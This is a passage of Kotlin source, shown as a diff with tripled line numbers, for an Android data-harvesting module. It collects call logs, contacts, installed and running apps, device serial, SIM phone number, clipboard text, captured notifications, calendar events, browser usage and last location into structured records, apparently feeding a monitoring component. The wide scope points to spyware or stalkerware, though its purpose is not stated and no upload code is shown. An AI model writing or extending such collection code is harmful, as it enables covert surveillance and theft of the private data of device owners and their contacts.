@@ -1,0 +1,534 @@
+    60→    60→    60→        Telephony.Sms.MESSAGE_TYPE_DRAFT -> "draft"
+    61→    61→    61→        Telephony.Sms.MESSAGE_TYPE_OUTBOX -> "outbox"
+    62→    62→    62→        Telephony.Sms.MESSAGE_TYPE_FAILED -> "failed"
+    63→    63→    63→        Telephony.Sms.MESSAGE_TYPE_QUEUED -> "queued"
+    64→    64→    64→        else -> "unknown"
+    65→    65→    65→    }
+    66→    66→    66→
+    67→    67→    67→    // ===== CALLS =====
+    68→    68→    68→    fun getCalls(context: Context): List<Map<String, Any>> {
+    69→    69→    69→        val list = mutableListOf<Map<String, Any>>()
+    70→    70→    70→        try {
+    71→    71→    71→            val uri = CallLog.Calls.CONTENT_URI
+    72→    72→    72→            val projection = arrayOf(
+    73→    73→    73→                CallLog.Calls._ID, CallLog.Calls.NUMBER, CallLog.Calls.CACHED_NAME,
+    74→    74→    74→                CallLog.Calls.DATE, CallLog.Calls.DURATION, CallLog.Calls.TYPE
+    75→    75→    75→            )
+    76→    76→    76→            val sortOrder = "${CallLog.Calls.DATE} DESC"
+    77→    77→    77→
+    78→    78→    78→            context.contentResolver.query(uri, projection, null, null, sortOrder)?.use { cursor ->
+    79→    79→    79→                var count = 0
+    80→    80→    80→                while (cursor.moveToNext() && count < 200) {
+    81→    81→    81→                    list.add(mapOf(
+    82→    82→    82→                        "id" to cursor.getLong(0),
+    83→    83→    83→                        "number" to (cursor.getString(1) ?: "unknown"),
+    84→    84→    84→                        "name" to (cursor.getString(2) ?: ""),
+    85→    85→    85→                        "date" to formatDate(cursor.getLong(3)),
+    86→    86→    86→                        "duration" to "${cursor.getLong(4)} sec",
+    87→    87→    87→                        "type" to callType(cursor.getInt(5))
+    88→    88→    88→                    ))
+    89→    89→    89→                    count++
+    90→    90→    90→                }
+    91→    91→    91→            }
+    92→    92→    92→        } catch (e: SecurityException) {
+    93→    93→    93→            Log.e(TAG, "Calls permission denied", e)
+    94→    94→    94→        } catch (e: Exception) {
+    95→    95→    95→            Log.e(TAG, "getCalls error", e)
+    96→    96→    96→        }
+    97→    97→    97→        return list
+    98→    98→    98→    }
+    99→    99→    99→
+   100→   100→   100→    private fun callType(type: Int): String = when (type) {
+   101→   101→   101→        CallLog.Calls.INCOMING_TYPE -> "incoming"
+   102→   102→   102→        CallLog.Calls.OUTGOING_TYPE -> "outgoing"
+   103→   103→   103→        CallLog.Calls.MISSED_TYPE -> "missed"
+   104→   104→   104→        CallLog.Calls.REJECTED_TYPE -> "rejected"
+   105→   105→   105→        else -> "unknown"
+   106→   106→   106→    }
+   107→   107→   107→
+   108→   108→   108→    // ===== CONTACTS =====
+   109→   109→   109→    fun getContacts(context: Context): List<Map<String, Any>> {
+   110→   110→   110→        val list = mutableListOf<Map<String, Any>>()
+   111→   111→   111→        try {
+   112→   112→   112→            // Batch query all phone numbers upfront to avoid N+1 queries
+   113→   113→   113→            val phoneMap = mutableMapOf<String, MutableList<String>>()
+   114→   114→   114→            context.contentResolver.query(
+   115→   115→   115→                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+   116→   116→   116→                arrayOf(ContactsContract.CommonDataKinds.Phone.CONTACT_ID, ContactsContract.CommonDataKinds.Phone.NUMBER),
+   117→   117→   117→                null, null, null
+   118→   118→   118→            )?.use { pc ->
+   119→   119→   119→                val idCol = pc.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.CONTACT_ID)
+   120→   120→   120→                val numCol = pc.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)
+   121→   121→   121→                while (pc.moveToNext()) {
+   122→   122→   122→                    val contactId = pc.getString(idCol)
+   123→   123→   123→                    val number = pc.getString(numCol)
+   124→   124→   124→                    phoneMap.getOrPut(contactId) { mutableListOf() }.add(number)
+   125→   125→   125→                }
+   126→   126→   126→            }
+   127→   127→   127→
+   128→   128→   128→            // Batch query all emails upfront
+   129→   129→   129→            val emailMap = mutableMapOf<String, MutableList<String>>()
+   130→   130→   130→            context.contentResolver.query(
+   131→   131→   131→                ContactsContract.CommonDataKinds.Email.CONTENT_URI,
+   132→   132→   132→                arrayOf(ContactsContract.CommonDataKinds.Email.CONTACT_ID, ContactsContract.CommonDataKinds.Email.DATA),
+   133→   133→   133→                null, null, null
+   134→   134→   134→            )?.use { ec ->
+   135→   135→   135→                val idCol = ec.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Email.CONTACT_ID)
+   136→   136→   136→                val dataCol = ec.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Email.DATA)
+   137→   137→   137→                while (ec.moveToNext()) {
+   138→   138→   138→                    val contactId = ec.getString(idCol)
+   139→   139→   139→                    val email = ec.getString(dataCol)
+   140→   140→   140→                    emailMap.getOrPut(contactId) { mutableListOf() }.add(email)
+   141→   141→   141→                }
+   142→   142→   142→            }
+   143→   143→   143→
+   144→   144→   144→            // Now iterate contacts and join from maps
+   145→   145→   145→            val cursor = context.contentResolver.query(
+   146→   146→   146→                ContactsContract.Contacts.CONTENT_URI, null, null, null,
+   147→   147→   147→                "${ContactsContract.Contacts.DISPLAY_NAME} ASC"
+   148→   148→   148→            )
+   149→   149→   149→            cursor?.use {
+   150→   150→   150→                var count = 0
+   151→   151→   151→                while (it.moveToNext() && count < 500) {
+   152→   152→   152→                    val id = it.getString(it.getColumnIndexOrThrow(ContactsContract.Contacts._ID))
+   153→   153→   153→                    val name = it.getString(it.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME))
+   154→   154→   154→
+   155→   155→   155→                    list.add(mapOf(
+   156→   156→   156→                        "id" to id,
+   157→   157→   157→                        "name" to name,
+   158→   158→   158→                        "phones" to (phoneMap[id] ?: emptyList()),
+   159→   159→   159→                        "emails" to (emailMap[id] ?: emptyList())
+   160→   160→   160→                    ))
+   161→   161→   161→                    count++
+   162→   162→   162→                }
+   163→   163→   163→            }
+   164→   164→   164→        } catch (e: SecurityException) {
+   165→   165→   165→            Log.e(TAG, "Contacts permission denied", e)
+   166→   166→   166→        } catch (e: Exception) {
+   167→   167→   167→            Log.e(TAG, "getContacts error", e)
+   168→   168→   168→        }
+   169→   169→   169→        return list
+   170→   170→   170→    }
+   171→   171→   171→
+   172→   172→   172→    // ===== APPS =====
+   173→   173→   173→    fun getApps(context: Context): List<Map<String, Any>> {
+   174→   174→   174→        val list = mutableListOf<Map<String, Any>>()
+   175→   175→   175→        try {
+   176→   176→   176→            val pm = context.packageManager
+   177→   177→   177→            val packages = pm.getInstalledPackages(0)
+   178→   178→   178→            for (pkg in packages) {
+   179→   179→   179→                list.add(mapOf(
+   180→   180→   180→                    "package" to pkg.packageName,
+   181→   181→   181→                    "name" to (pkg.applicationInfo?.loadLabel(pm)?.toString() ?: pkg.packageName),
+   182→   182→   182→                    "version" to (pkg.versionName ?: ""),
+   183→   183→   183→                    "system" to ((pkg.applicationInfo?.flags ?: 0) and android.content.pm.ApplicationInfo.FLAG_SYSTEM != 0),
+   184→   184→   184→                    "first_install" to formatDate(pkg.firstInstallTime),
+   185→   185→   185→                    "last_update" to formatDate(pkg.lastUpdateTime)
+   186→   186→   186→                ))
+   187→   187→   187→            }
+   188→   188→   188→        } catch (e: Exception) {
+   189→   189→   189→            Log.e(TAG, "getApps error", e)
+   190→   190→   190→        }
+   191→   191→   191→        return list
+   192→   192→   192→    }
+   193→   193→   193→
+   194→   194→   194→    // ===== RUNNING APPS =====
+   195→   195→   195→    fun getRunningApps(context: Context): List<Map<String, Any>> {
+   196→   196→   196→        val list = mutableListOf<Map<String, Any>>()
+   197→   197→   197→        try {
+   198→   198→   198→            val am = context.getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
+   199→   199→   199→            val processes = am.runningAppProcesses ?: return list
+   200→   200→   200→            val pm = context.packageManager
+   201→   201→   201→            for (proc in processes) {
+   202→   202→   202→                try {
+   203→   203→   203→                    val appInfo = pm.getApplicationInfo(proc.processName, 0)
+   204→   204→   204→                    val name = pm.getApplicationLabel(appInfo).toString()
+   205→   205→   205→                    list.add(mapOf(
+   206→   206→   206→                        "process" to proc.processName,
+   207→   207→   207→                        "name" to name,
+   208→   208→   208→                        "pid" to proc.pid,
+   209→   209→   209→                        "importance" to proc.importance.toString()
+   210→   210→   210→                    ))
+   211→   211→   211→                } catch (_: Exception) {}
+   212→   212→   212→            }
+   213→   213→   213→        } catch (e: Exception) {
+   214→   214→   214→            Log.e(TAG, "getRunningApps error", e)
+   215→   215→   215→        }
+   216→   216→   216→        return list
+   217→   217→   217→    }
+   218→   218→   218→
+   219→   219→   219→    // ===== DEVICE INFO =====
+   220→   220→   220→    fun getDeviceInfo(context: Context): Map<String, Any> {
+   221→   221→   221→        val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager
+   222→   222→   222→        return mapOf(
+   223→   223→   223→            "device_id" to DeviceUtils.getDeviceId(context),
+   224→   224→   224→            "model" to Build.MODEL,
+   225→   225→   225→            "brand" to Build.BRAND,
+   226→   226→   226→            "manufacturer" to Build.MANUFACTURER,
+   227→   227→   227→            "android" to Build.VERSION.RELEASE,
+   228→   228→   228→            "sdk" to Build.VERSION.SDK_INT,
+   229→   229→   229→            "serial" to if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+   230→   230→   230→                try { Build.getSerial() } catch (_: Exception) { "unknown" }
+   231→   231→   231→            } else {
+   232→   232→   232→                @Suppress("DEPRECATION") Build.SERIAL ?: "unknown"
+   233→   233→   233→            },
+   234→   234→   234→            "sim_operator" to (tm?.simOperatorName ?: ""),
+   235→   235→   235→            "sim_country" to (tm?.simCountryIso ?: ""),
+   236→   236→   236→            "phone_type" to (tm?.phoneType?.toString() ?: ""),
+   237→   237→   237→            "network_type" to (tm?.networkType?.toString() ?: ""),
+   238→   238→   238→            "screen_width" to (context.resources?.displayMetrics?.widthPixels ?: 0),
+   239→   239→   239→            "screen_height" to (context.resources?.displayMetrics?.heightPixels ?: 0),
+   240→   240→   240→            "total_memory" to (Runtime.getRuntime().totalMemory() / 1048576),
+   241→   241→   241→            "available_memory" to (Runtime.getRuntime().freeMemory() / 1048576),
+   242→   242→   242→            "cores" to Runtime.getRuntime().availableProcessors()
+   243→   243→   243→        )
+   244→   244→   244→    }
+   245→   245→   245→
+   246→   246→   246→    // ===== BATTERY =====
+   247→   247→   247→    fun getBattery(context: Context): Map<String, Any> {
+   248→   248→   248→        try {
+   249→   249→   249→            val filter = android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED)
+   250→   250→   250→            val battery = context.registerReceiver(null, filter) ?: return mapOf("level" to 0)
+   251→   251→   251→            val level = battery.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1)
+   252→   252→   252→            val scale = battery.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1)
+   253→   253→   253→            val percent = if (scale > 0) (level * 100 / scale.toFloat()).toInt() else 0
+   254→   254→   254→            val status = when (battery.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1)) {
+   255→   255→   255→                android.os.BatteryManager.BATTERY_STATUS_CHARGING -> "charging"
+   256→   256→   256→                android.os.BatteryManager.BATTERY_STATUS_DISCHARGING -> "discharging"
+   257→   257→   257→                android.os.BatteryManager.BATTERY_STATUS_FULL -> "full"
+   258→   258→   258→                android.os.BatteryManager.BATTERY_STATUS_NOT_CHARGING -> "not_charging"
+   259→   259→   259→                else -> "unknown"
+   260→   260→   260→            }
+   261→   261→   261→            val plugged = when (battery.getIntExtra(android.os.BatteryManager.EXTRA_PLUGGED, -1)) {
+   262→   262→   262→                android.os.BatteryManager.BATTERY_PLUGGED_AC -> "AC"
+   263→   263→   263→                android.os.BatteryManager.BATTERY_PLUGGED_USB -> "USB"
+   264→   264→   264→                android.os.BatteryManager.BATTERY_PLUGGED_WIRELESS -> "wireless"
+   265→   265→   265→                else -> "none"
+   266→   266→   266→            }
+   267→   267→   267→            val temp = battery.getIntExtra(android.os.BatteryManager.EXTRA_TEMPERATURE, 0) / 10.0
+   268→   268→   268→            val voltage = battery.getIntExtra(android.os.BatteryManager.EXTRA_VOLTAGE, 0) / 1000.0
+   269→   269→   269→            val health = when (battery.getIntExtra(android.os.BatteryManager.EXTRA_HEALTH, -1)) {
+   270→   270→   270→                android.os.BatteryManager.BATTERY_HEALTH_GOOD -> "good"
+   271→   271→   271→                android.os.BatteryManager.BATTERY_HEALTH_OVERHEAT -> "overheat"
+   272→   272→   272→                android.os.BatteryManager.BATTERY_HEALTH_DEAD -> "dead"
+   273→   273→   273→                android.os.BatteryManager.BATTERY_HEALTH_OVER_VOLTAGE -> "over_voltage"
+   274→   274→   274→                else -> "unknown"
+   275→   275→   275→            }
+   276→   276→   276→            return mapOf(
+   277→   277→   277→                "level" to percent,
+   278→   278→   278→                "status" to status,
+   279→   279→   279→                "plugged" to plugged,
+   280→   280→   280→                "temperature" to "${temp}C",
+   281→   281→   281→                "voltage" to "${voltage}V",
+   282→   282→   282→                "health" to health,
+   283→   283→   283→                "technology" to (battery.getStringExtra(android.os.BatteryManager.EXTRA_TECHNOLOGY) ?: "")
+   284→   284→   284→            )
+   285→   285→   285→        } catch (e: Exception) {
+   286→   286→   286→            return mapOf("level" to 0, "error" to (e.message ?: ""))
+   287→   287→   287→        }
+   288→   288→   288→    }
+   289→   289→   289→
+   290→   290→   290→    // ===== WIFI INFO =====
+   291→   291→   291→    fun getWifiInfo(context: Context): Map<String, Any> {
+   292→   292→   292→        return try {
+   293→   293→   293→            val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as android.net.ConnectivityManager
+   294→   294→   294→            val wifiManager = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
+   295→   295→   295→            val info = wifiManager.connectionInfo
+   296→   296→   296→            
+   297→   297→   297→            // Get IP using ConnectivityManager (works on all API levels)
+   298→   298→   298→            var ip = "0.0.0.0"
+   299→   299→   299→            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+   300→   300→   300→                val network = cm.activeNetwork
+   301→   301→   301→                val linkProps = cm.getLinkProperties(network)
+   302→   302→   302→                linkProps?.linkAddresses?.forEach { addr ->
+   303→   303→   303→                    if (!addr.address.isLinkLocalAddress && addr.address is java.net.Inet4Address) {
+   304→   304→   304→                        ip = addr.address.hostAddress ?: "0.0.0.0"
+   305→   305→   305→                        return@forEach
+   306→   306→   306→                    }
+   307→   307→   307→                }
+   308→   308→   308→            } else {
+   309→   309→   309→                @Suppress("DEPRECATION")
+   310→   310→   310→                ip = String.format(
+   311→   311→   311→                    "%d.%d.%d.%d",
+   312→   312→   312→                    info.ipAddress and 0xff,
+   313→   313→   313→                    (info.ipAddress shr 8) and 0xff,
+   314→   314→   314→                    (info.ipAddress shr 16) and 0xff,
+   315→   315→   315→                    (info.ipAddress shr 24) and 0xff
+   316→   316→   316→                )
+   317→   317→   317→            }
+   318→   318→   318→            
+   319→   319→   319→            var ssid = ""
+   320→   320→   320→            var bssid = ""
+   321→   321→   321→            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+   322→   322→   322→                if (context.checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
+   323→   323→   323→                    try { ssid = info.ssid?.removeSurrounding("\"") ?: "" } catch (_: Exception) {}
+   324→   324→   324→                    try { bssid = info.bssid ?: "" } catch (_: Exception) {}
+   325→   325→   325→                } else {
+   326→   326→   326→                    ssid = "<location permission required>"
+   327→   327→   327→                    bssid = "<location permission required>"
+   328→   328→   328→                }
+   329→   329→   329→            } else {
+   330→   330→   330→                try { ssid = info.ssid?.removeSurrounding("\"") ?: "" } catch (_: Exception) {}
+   331→   331→   331→                try { bssid = info.bssid ?: "" } catch (_: Exception) {}
+   332→   332→   332→            }
+   333→   333→   333→            
+   334→   334→   334→            mapOf(
+   335→   335→   335→                "ssid" to ssid,
+   336→   336→   336→                "bssid" to bssid,
+   337→   337→   337→                "ip" to ip,
+   338→   338→   338→                "rssi" to info.rssi,
+   339→   339→   339→                "speed" to info.linkSpeed,
+   340→   340→   340→                "frequency" to info.frequency,
+   341→   341→   341→                "network_id" to info.networkId,
+   342→   342→   342→                "enabled" to wifiManager.isWifiEnabled
+   343→   343→   343→            )
+   344→   344→   344→        } catch (e: Exception) {
+   345→   345→   345→            mapOf("error" to (e.message ?: "Unable to get WiFi info"))
+   346→   346→   346→        }
+   347→   347→   347→    }
+   348→   348→   348→
+   349→   349→   349→    // ===== NETWORK INFO =====
+   350→   350→   350→    fun getNetworkInfo(context: Context): Map<String, Any> {
+   351→   351→   351→        return try {
+   352→   352→   352→            val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as android.net.ConnectivityManager
+   353→   353→   353→            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+   354→   354→   354→                val network = cm.activeNetwork
+   355→   355→   355→                val caps = cm.getNetworkCapabilities(network)
+   356→   356→   356→                val connected = caps != null && caps.hasCapability(android.net.NetworkCapabilities.NET_CAPABILITY_INTERNET)
+   357→   357→   357→                var type = "none"
+   358→   358→   358→                if (caps != null) {
+   359→   359→   359→                    when {
+   360→   360→   360→                        caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_WIFI) -> type = "WIFI"
+   361→   361→   361→                        caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_CELLULAR) -> type = "MOBILE"
+   362→   362→   362→                        caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_ETHERNET) -> type = "ETHERNET"
+   363→   363→   363→                        caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_BLUETOOTH) -> type = "BLUETOOTH"
+   364→   364→   364→                        caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_VPN) -> type = "VPN"
+   365→   365→   365→                    }
+   366→   366→   366→                }
+   367→   367→   367→                mapOf(
+   368→   368→   368→                    "connected" to connected,
+   369→   369→   369→                    "type" to type,
+   370→   370→   370→                    "subtype" to "",
+   371→   371→   371→                    "roaming" to false
+   372→   372→   372→                )
+   373→   373→   373→            } else {
+   374→   374→   374→                @Suppress("DEPRECATION")
+   375→   375→   375→                val activeNetwork = cm.activeNetworkInfo
+   376→   376→   376→                mapOf(
+   377→   377→   377→                    "connected" to (activeNetwork?.isConnected ?: false),
+   378→   378→   378→                    "type" to (activeNetwork?.typeName ?: "none"),
+   379→   379→   379→                    "subtype" to (activeNetwork?.subtypeName ?: ""),
+   380→   380→   380→                    "roaming" to (activeNetwork?.isRoaming ?: false)
+   381→   381→   381→                )
+   382→   382→   382→            }
+   383→   383→   383→        } catch (e: Exception) {
+   384→   384→   384→            mapOf("error" to (e.message ?: ""))
+   385→   385→   385→        }
+   386→   386→   386→    }
+   387→   387→   387→
+   388→   388→   388→    // ===== SIM INFO =====
+   389→   389→   389→    fun getSimInfo(context: Context): Map<String, Any> {
+   390→   390→   390→        val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager
+   391→   391→   391→        return mapOf(
+   392→   392→   392→            "sim_state" to (tm?.simState?.toString() ?: ""),
+   393→   393→   393→            "operator" to (tm?.simOperatorName ?: ""),
+   394→   394→   394→            "operator_code" to (tm?.simOperator ?: ""),
+   395→   395→   395→            "country" to (tm?.simCountryIso ?: ""),
+   396→   396→   396→            "phone_number" to try {
+   397→   397→   397→                @Suppress("DEPRECATION")
+   398→   398→   398→                (tm?.line1Number ?: "")
+   399→   399→   399→            } catch (_: Exception) { "" },
+   400→   400→   400→            "network_name" to (tm?.networkOperatorName ?: "")
+   401→   401→   401→        )
+   402→   402→   402→    }
+   403→   403→   403→
+   404→   404→   404→    // ===== STORAGE INFO =====
+   405→   405→   405→    fun getStorageInfo(context: Context): List<Map<String, Any>> {
+   406→   406→   406→        val list = mutableListOf<Map<String, Any>>()
+   407→   407→   407→        try {
+   408→   408→   408→            val stat = android.os.Environment.getDataDirectory()
+   409→   409→   409→            val statFs = android.os.StatFs(stat.absolutePath)
+   410→   410→   410→            val total = statFs.totalBytes / (1024.0 * 1024.0 * 1024.0)
+   411→   411→   411→            val available = statFs.availableBytes / (1024.0 * 1024.0 * 1024.0)
+   412→   412→   412→            val used = total - available
+   413→   413→   413→            list.add(mapOf(
+   414→   414→   414→                "type" to "Internal",
+   415→   415→   415→                "total" to "%.2f GB".format(total),
+   416→   416→   416→                "used" to "%.2f GB".format(used),
+   417→   417→   417→                "available" to "%.2f GB".format(available),
+   418→   418→   418→                "percent_used" to "%.1f".format(used / total * 100)
+   419→   419→   419→            ))
+   420→   420→   420→
+   421→   421→   421→            // External storage
+   422→   422→   422→            val externalDirs = context.getExternalFilesDirs(null)
+   423→   423→   423→            if (externalDirs.size > 1 && !externalDirs[1].path.contains("emulated")) {
+   424→   424→   424→                val extStat = android.os.StatFs(externalDirs[1].path)
+   425→   425→   425→                val extTotal = extStat.totalBytes / (1024.0 * 1024.0 * 1024.0)
+   426→   426→   426→                val extAvail = extStat.availableBytes / (1024.0 * 1024.0 * 1024.0)
+   427→   427→   427→                list.add(mapOf(
+   428→   428→   428→                    "type" to "External (SD)",
+   429→   429→   429→                    "total" to "%.2f GB".format(extTotal),
+   430→   430→   430→                    "used" to "%.2f GB".format(extTotal - extAvail),
+   431→   431→   431→                    "available" to "%.2f GB".format(extAvail),
+   432→   432→   432→                    "percent_used" to "%.1f".format((extTotal - extAvail) / extTotal * 100)
+   433→   433→   433→                ))
+   434→   434→   434→            }
+   435→   435→   435→        } catch (e: Exception) {
+   436→   436→   436→            Log.e(TAG, "getStorageInfo error", e)
+   437→   437→   437→        }
+   438→   438→   438→        return list
+   439→   439→   439→    }
+   440→   440→   440→
+   441→   441→   441→    // ===== CLIPBOARD =====
+   442→   442→   442→    fun getClipboard(context: Context): String {
+   443→   443→   443→        try {
+   444→   444→   444→            val cm = context.getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager
+   445→   445→   445→            val clip = cm.primaryClip
+   446→   446→   446→            return clip?.getItemAt(0)?.text?.toString() ?: ""
+   447→   447→   447→        } catch (e: Exception) {
+   448→   448→   448→            return "Error: ${e.message}"
+   449→   449→   449→        }
+   450→   450→   450→    }
+   451→   451→   451→
+   452→   452→   452→    // ===== NOTIFICATIONS =====
+   453→   453→   453→    fun getRecentNotifications(context: Context): List<Map<String, Any>> {
+   454→   454→   454→        val history = MonitorExecutor.getNotificationHistory()
+   455→   455→   455→        return if (history.isNotEmpty()) {
+   456→   456→   456→            history
+   457→   457→   457→        } else {
+   458→   458→   458→            listOf(mapOf("message" to "Notification access requires NotificationListenerService", "hint" to "Ensure MyNotificationListenerService is enabled in Settings > Accessibility"))
+   459→   459→   459→        }
+   460→   460→   460→    }
+   461→   461→   461→
+   462→   462→   462→    // ===== CALENDAR =====
+   463→   463→   463→    fun getCalendar(context: Context): List<Map<String, Any>> {
+   464→   464→   464→        val list = mutableListOf<Map<String, Any>>()
+   465→   465→   465→        try {
+   466→   466→   466→            val uri = CalendarContract.Events.CONTENT_URI
+   467→   467→   467→            val projection = arrayOf(
+   468→   468→   468→                CalendarContract.Events._ID, CalendarContract.Events.TITLE,
+   469→   469→   469→                CalendarContract.Events.DESCRIPTION, CalendarContract.Events.DTSTART,
+   470→   470→   470→                CalendarContract.Events.DTEND, CalendarContract.Events.EVENT_LOCATION
+   471→   471→   471→            )
+   472→   472→   472→            val now = System.currentTimeMillis()
+   473→   473→   473→            val selection = "${CalendarContract.Events.DTEND} > ?"
+   474→   474→   474→            val selectionArgs = arrayOf(now.toString())
+   475→   475→   475→
+   476→   476→   476→            context.contentResolver.query(uri, projection, selection, selectionArgs, null)?.use { cursor ->
+   477→   477→   477→                while (cursor.moveToNext()) {
+   478→   478→   478→                    list.add(mapOf(
+   479→   479→   479→                        "id" to cursor.getLong(0),
+   480→   480→   480→                        "title" to (cursor.getString(1) ?: ""),
+   481→   481→   481→                        "description" to (cursor.getString(2) ?: ""),
+   482→   482→   482→                        "start" to formatDate(cursor.getLong(3)),
+   483→   483→   483→                        "end" to formatDate(cursor.getLong(4)),
+   484→   484→   484→                        "location" to (cursor.getString(5) ?: "")
+   485→   485→   485→                    ))
+   486→   486→   486→                }
+   487→   487→   487→            }
+   488→   488→   488→        } catch (e: SecurityException) {
+   489→   489→   489→            Log.e(TAG, "Calendar permission denied", e)
+   490→   490→   490→        } catch (e: Exception) {
+   491→   491→   491→            Log.e(TAG, "getCalendar error", e)
+   492→   492→   492→        }
+   493→   493→   493→        return list
+   494→   494→   494→    }
+   495→   495→   495→
+   496→   496→   496→    // ===== BROWSER HISTORY =====
+   497→   497→   497→    fun getBrowserHistory(context: Context): List<Map<String, Any>> {
+   498→   498→   498→        val list = mutableListOf<Map<String, Any>>()
+   499→   499→   499→        try {
+   500→   500→   500→            val browserPackages = listOf(
+   501→   501→   501→                "com.android.chrome",
+   502→   502→   502→                "com.chrome.beta",
+   503→   503→   503→                "org.mozilla.firefox",
+   504→   504→   504→                "org.mozilla.focus",
+   505→   505→   505→                "org.mozilla.firefox_beta",
+   506→   506→   506→                "com.sec.android.app.sbrowser",
+   507→   507→   507→                "com.opera.browser",
+   508→   508→   508→                "com.opera.mini.native",
+   509→   509→   509→                "com.microsoft.emmx",
+   510→   510→   510→                "com.brave.browser",
+   511→   511→   511→                "com.UCMobile.intl",
+   512→   512→   512→                "com.android.browser"
+   513→   513→   513→            )
+   514→   514→   514→            val usageStatsManager = context.getSystemService(Context.USAGE_STATS_SERVICE) as? android.app.usage.UsageStatsManager
+   515→   515→   515→                ?: return listOf(mapOf("message" to "UsageStatsManager not available"))
+   516→   516→   516→            val endTime = System.currentTimeMillis()
+   517→   517→   517→            val startTime = endTime - (7 * 24 * 60 * 60 * 1000L) // last 7 days
+   518→   518→   518→            val events = usageStatsManager.queryEvents(startTime, endTime)
+   519→   519→   519→            val sdf = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
+   520→   520→   520→            val eventList = mutableListOf<Map<String, Any>>()
+   521→   521→   521→            while (events.hasNextEvent()) {
+   522→   522→   522→                val event = android.app.usage.UsageEvents.Event()
+   523→   523→   523→                events.getNextEvent(event)
+   524→   524→   524→                // Copy fields into a new map instead of storing the reusable Event object
+   525→   525→   525→                eventList.add(mapOf(
+   526→   526→   526→                    "packageName" to event.packageName,
+   527→   527→   527→                    "eventType" to event.eventType,
+   528→   528→   528→                    "timeStamp" to event.timeStamp
+   529→   529→   529→                ))
+   530→   530→   530→            }
+   531→   531→   531→            val recentBrowserEvents = eventList
+   532→   532→   532→                .filter { it["packageName"] in browserPackages && it["eventType"] == android.app.usage.UsageEvents.Event.ACTIVITY_RESUMED }
+   533→   533→   533→                .sortedByDescending { it["timeStamp"] as Long }
+   534→   534→   534→                .take(50)
+   535→   535→   535→            val pm = context.packageManager
+   536→   536→   536→            for (event in recentBrowserEvents) {
+   537→   537→   537→                val pkgName = event["packageName"] as String
+   538→   538→   538→                val timestamp = event["timeStamp"] as Long
+   539→   539→   539→                val appName = try {
+   540→   540→   540→                    pm.getApplicationLabel(pm.getApplicationInfo(pkgName, 0)).toString()
+   541→   541→   541→                } catch (_: Exception) { pkgName }
+   542→   542→   542→                list.add(mapOf(
+   543→   543→   543→                    "package" to pkgName,
+   544→   544→   544→                    "app" to appName,
+   545→   545→   545→                    "timestamp" to timestamp,
+   546→   546→   546→                    "datetime" to sdf.format(Date(timestamp))
+   547→   547→   547→                ))
+   548→   548→   548→            }
+   549→   549→   549→            if (list.isEmpty()) {
+   550→   550→   550→                list.add(mapOf("message" to "No recent browser usage found (requires PACKAGE_USAGE_STATS permission)"))
+   551→   551→   551→            }
+   552→   552→   552→        } catch (e: SecurityException) {
+   553→   553→   553→            Log.e(TAG, "Browser history permission denied", e)
+   554→   554→   554→            return listOf(mapOf("message" to "PACKAGE_USAGE_STATS permission required. Grant it in Settings > Security > Usage Access"))
+   555→   555→   555→        } catch (e: Exception) {
+   556→   556→   556→            Log.e(TAG, "getBrowserHistory error", e)
+   557→   557→   557→            return listOf(mapOf("message" to "Error: ${e.message}"))
+   558→   558→   558→        }
+   559→   559→   559→        return list
+   560→   560→   560→    }
+   561→   561→   561→
+   562→   562→   562→    // ===== LOCATION =====
+   563→   563→   563→    fun getLastLocation(context: Context): Map<String, Any> {
+   564→   564→   564→        return try {
+   565→   565→   565→            val lm = context.getSystemService(Context.LOCATION_SERVICE) as android.location.LocationManager
+   566→   566→   566→            val location = lm.getLastKnownLocation(android.location.LocationManager.GPS_PROVIDER)
+   567→   567→   567→                ?: lm.getLastKnownLocation(android.location.LocationManager.NETWORK_PROVIDER)
+   568→   568→   568→            if (location != null) {
+   569→   569→   569→                mapOf(
+   570→   570→   570→                    "lat" to location.latitude,
+   571→   571→   571→                    "lon" to location.longitude,
+   572→   572→   572→                    "accuracy" to location.accuracy,
+   573→   573→   573→                    "speed" to location.speed,
+   574→   574→   574→                    "time" to formatDate(location.time)
+   575→   575→   575→                )
+   576→   576→   576→            } else {
+   577→   577→   577→                mapOf("error" to "No last known location")
+   578→   578→   578→            }
+   579→   579→   579→        } catch (e: SecurityException) {
+   580→   580→   580→            mapOf("error" to "Location permission denied")
+   581→   581→   581→        } catch (e: Exception) {
+   582→   582→   582→            mapOf<String, Any>("error" to (e.message ?: "Unknown error"))
+   583→   583→   583→        }
+   584→   584→   584→    }
+   585→   585→   585→
+   586→   586→   586→    // ===== HELPERS =====
+   587→   587→   587→    private fun formatDate(timestamp: Long): String {
+   588→   588→   588→        if (timestamp <= 0) return ""
+   589→   589→   589→        val sdf = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
+   590→   590→   590→        return sdf.format(Date(timestamp))
+   591→   591→   591→    }
+   592→   592→   592→}
+   593→   593→   593→
